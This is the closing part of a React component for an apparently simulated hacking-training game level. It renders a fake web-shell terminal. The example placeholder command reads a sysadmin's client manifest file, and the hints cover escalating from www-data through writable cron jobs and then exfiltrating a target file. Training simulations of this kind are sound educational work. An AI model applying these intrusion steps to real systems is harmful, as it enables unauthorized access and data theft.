                      <AlertTriangle className="h-4 w-4" />
                      <AlertDescription>
                        No web shell access. Complete file upload phase first.
                      </AlertDescription>
                    </Alert>
                  ) : (
                    <div className="space-y-4">
                      <div className="terminal p-4 rounded-lg h-[400px] overflow-y-auto font-mono text-sm">
                        {shellOutput.map((line, idx) => (
                          <div key={idx} className={line.startsWith('$') ? 'text-cyan-400 mt-2' : 'text-green-400'}>
                            {line}
                          </div>
                        ))}
                      </div>

                      <div className="flex gap-2">
                        <Input
                          value={shellCommand}
                          onChange={(e) => setShellCommand(e.target.value)}
                          onKeyDown={(e) => {
                            if (e.key === 'Enter') {
                              executeShellCommand(shellCommand);
                              setShellCommand('');
                            }
                          }}
                          placeholder="Enter command (whoami, id, ls, cat /home/sysadmin/client_manifest.csv)..."
                          className="font-mono bg-black/60"
                        />
                        <Button 
                          onClick={() => {
                            executeShellCommand(shellCommand);
                            setShellCommand('');
                          }}
                        >
                          Execute
                        </Button>
                      </div>

                      {!rootAccess && (
                        <Alert className="border-yellow-500/50 bg-yellow-500/10">
                          <AlertTriangle className="h-4 w-4" />
                          <AlertDescription className="text-sm">
                            <strong>Current privilege level: www-data (low)</strong><br />
                            Run an enumeration script to find privilege escalation vectors. 
                            Hint: Check for writable cron jobs.
                          </AlertDescription>
                        </Alert>
                      )}

                      {rootAccess && (
                        <Alert className="border-green-500/50 bg-green-500/10">
                          <CheckCircle className="h-4 w-4" />
                          <AlertDescription>
                            <strong>Root access achieved!</strong> Exfiltrate the target file to complete the mission.
                          </AlertDescription>
                        </Alert>
                      )}

                      {completedPhases.includes(5) && (
                        <Alert style={{
                          background: 'rgba(139, 92, 246, 0.1)',
                          border: '1px solid rgba(139, 92, 246, 0.3)',
                        }}>
                          <Target className="h-4 w-4" style={{ color: '#8B5CF6' }} />
                          <AlertDescription>
                            <div className="text-center">
                              <div className="text-2xl font-bold mb-2" style={{ color: 'hsl(var(--blacksite-purple))' }}>
                                🎯 MISSION COMPLETE
                              </div>
                              <p className="text-sm mb-3">
                                All objectives achieved in {formatTime(missionTime)}
                              </p>
                              <Button 
                                asChild
                                variant="default"
                                className="bg-[hsl(var(--blacksite-purple))] hover:bg-[hsl(var(--blacksite-purple))]/80"
                              >
                                <a href="/blacksite-missions">Return to Mission Board</a>
                              </Button>
                            </div>
                          </AlertDescription>
                        </Alert>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
    </div>
  );
};

export default Level26;
